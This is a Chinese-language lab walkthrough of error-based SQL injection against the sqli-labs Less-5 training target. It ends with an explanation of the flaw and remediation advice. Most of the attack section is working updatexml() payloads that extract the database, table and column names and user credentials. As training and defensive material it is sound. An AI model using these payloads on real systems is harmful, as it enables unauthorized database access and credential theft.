# SQL注入-报错注入漏洞复现（sqli-labs Less-5）

## 一、漏洞简介

报错注入适用于页面**没有数据回显，但会显示数据库报错信息**的场景。攻击者利用 `updatexml()`、`extractvalue()` 等函数，故意构造非法参数触发数据库报错，报错信息中夹带敏感数据。

**影响版本**：PHP + MySQL（未屏蔽错误回显的场景）

**漏洞危害**：数据库敏感信息泄露、数据篡改、甚至获取服务器控制权


## 二、实验环境

| 组件 | 版本/说明 |
|:---|:---|
| 集成环境 | PHPStudy（Apache + MySQL） |
| 靶场 | sqli-labs（Less-5） |
| 浏览器 | Chrome / Firefox |


## 三、报错注入 vs 联合注入对比

| 对比维度 | Less-1（联合注入） | Less-5（报错注入） |
|:---|:---|:---|
| 页面数据回显 | 有 | 无 |
| 页面报错信息 | 有 |  有（被攻击利用） |
| 核心函数 | `union select` | `updatexml()` / `extractvalue()` |
| 一次性获取数据量 | 可获取全部 | 最多 32 个字符，需分段或逐条获取 |


## 四、漏洞复现步骤

### 4.1 寻找注入点

访问 Less-5：

### 4.1 寻找注入点

访问 Less-5：

http://127.0.0.1/sqli-labs/Less-5/?id=1

页面显示 "You are in..."，无数据回显。

在参数后添加单引号测试：

http://127.0.0.1/sqli-labs/Less-5/?id=1'

页面返回数据库报错信息，确认存在注入。

![注入点报错](step1.png)

### 4.2 判断字段数

使用 ORDER BY 判断字段数：

?id=1' order by 4--+

页面报错，说明字段数小于4。

改用 `order by 3--+` 页面正常，故原查询共 **3个字段**。

![判断字段数](step2.png)

### 4.3 获取数据库名（报错注入）

利用 `updatexml()` 函数触发XPATH报错，将数据库名夹带出来：

?id=1' and updatexml(1,concat(0x7e,database()),1)--+

报错信息显示：`~security`，成功获取数据库名 `security`。

> **updatexml() 函数**：`updatexml(xml_target, xpath_expr, new_xml)` 用于更新XML内容。当第二个参数不是合法的XPath表达式时，MySQL会报错并将错误内容回显出来。`concat(0x7e, database())` 将 `~` 与库名拼接，让传入的XPath表达式非法从而触发报错。

> **0x7e**：十六进制，代表 `~` 波浪号，用于触发非法XPATH路径报错。

![获取数据库名](step3.png)

### 4.4 获取所有表名

?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security')),1)--+

报错信息显示表名列表：`emails,referers,uagents,users`

![获取表名](step4.png)

### 4.5 获取列名（以users表为例）

以 `users` 表为目标，由于 `group_concat()` 结果可能超过32字符，改用 `limit` 逐条获取。

获取第1个列名：

?id=1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1)),1)--+

报错回显 `~id`

获取第2个列名：

?id=1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 1,1)),1)--+

回显 `~username`

获取第3个列名：

?id=1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 2,1)),1)--+

回显 `~password`

![获取列名](step5.png)

### 4.6 获取数据（逐条脱库）

报错注入一次最多显示32个字符，需用 `limit` 逐条获取用户名和密码。

获取第1个用户名：

?id=1' and updatexml(1,concat(0x7e,(select username from users limit 0,1)),1)--+

回显 `~Dumb`

获取第1个密码：

?id=1' and updatexml(1,concat(0x7e,(select password from users limit 0,1)),1)--+

回显 `~Dumb`

继续修改 `limit 1,1`、`limit 2,1`... 可获取所有用户凭据。

![获取数据](step6.png)


## 五、漏洞原理分析

正常SQL语句（Less-5源码）：

SELECT * FROM users WHERE id='$id' LIMIT 0,1

攻击者输入：1' and updatexml(1,concat(0x7e,database()),1)--+

拼接后SQL：

SELECT * FROM users WHERE id='1' and updatexml(1,concat(0x7e,database()),1)--+' LIMIT 0,1

攻击原理：

第一步，updatexml 的第二个参数需为合法XPath表达式。第二步，concat(0x7e,database()) 拼出类似 `~security` 的非法XPath。第三步，MySQL报错，并将非法字符串（包含数据库名）显示给用户。第四步，攻击者从报错信息中提取敏感数据。


## 六、修复方案

最有效的修复方式是使用**参数化查询/预编译**（PDO或MySQLi的prepare方法），从根源消除注入。

其次是**关闭数据库错误回显**，生产环境设置 `display_errors=Off`，不暴露错误详情。即使存在注入点，攻击者也无法通过报错获取数据。

辅助措施包括对输入中的特殊字符进行过滤或转义，以及遵循最小权限原则，数据库账户仅授予必要权限。


## 七、总结

Less-5 是典型的报错注入场景，页面无数据回显但显示数据库错误信息。利用 `updatexml()` 或 `extractvalue()` 函数，故意触发非法XPath表达式报错来获取数据。

报错注入有两个关键限制：一次最多显示 32 个字符，多条数据需用 `limit` 子查询逐条获取。`0x7e`（即 `~`）用于构造非法XPath触发报错。


## 八、参考链接

- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- sqli-labs靶场: https://github.com/Audi-1/sqli-labs


